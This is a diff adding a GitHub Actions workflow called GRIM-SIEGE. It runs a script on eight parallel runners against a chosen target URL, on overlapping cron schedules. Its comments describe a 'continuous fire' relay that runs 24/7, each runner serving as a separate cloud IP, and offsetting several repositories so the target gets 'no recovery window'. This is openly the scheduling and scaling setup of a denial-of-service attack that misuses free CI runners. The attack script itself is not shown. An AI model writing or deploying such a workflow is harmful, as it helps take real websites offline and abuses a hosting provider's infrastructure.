@@ -1,0 +1,49 @@
+name: GRIM-SIEGE
+
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: 'Target URL'
+        required: true
+        default: 'https://target.example.com'
+      workers:
+        description: 'Workers per vector per runner'
+        required: false
+        default: '50'
+        type: string
+  # Continuous fire — every 4h, 8 runners x 5.5h max = seamless 24/7 relay
+  # 4h gap between triggers, runners run 5.5h = 1.5h overlap
+  # Multiple repos with offset schedules = no recovery window
+  schedule:
+    - cron: '0 */4 * * *'
+    - cron: '30 */4 * * *'
+    - cron: '0 */2 * * *'
+
+jobs:
+  siege:
+    runs-on: ubuntu-latest
+    timeout-minutes: 330
+    strategy:
+      fail-fast: false
+      # 8 parallel runners — each is an independent Azure IP
+      matrix:
+        slot: [1, 2, 3, 4, 5, 6, 7, 8]
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+
+      - name: Install deps
+        run: |
+          pip install curl_cffi
+
+      - name: Run GRIM
+        env:
+          TARGET: ${{ github.event.inputs.target || 'https://target.example.com' }}
+          WORKERS: ${{ github.event.inputs.workers || '50' }}
+          SLOT: ${{ matrix.slot }}
+        run: python3 runner.py
